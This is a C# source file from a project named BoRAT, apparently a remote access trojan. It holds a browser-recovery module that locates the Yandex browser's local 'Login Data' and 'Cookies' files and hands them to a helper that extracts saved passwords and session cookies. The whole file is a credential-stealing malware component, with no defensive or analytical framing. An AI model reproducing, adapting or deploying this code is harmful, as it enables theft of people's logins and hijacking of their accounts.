using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace BoRAT.Core.Recovery.Browsers
{
    class Yandex
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, "Yandex");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }

        public static List<Cookie> GetCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\Browser\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, "Yandex");
            }
            catch (Exception)
            {
                return new List<Cookie>();
            }
        }
    }
}
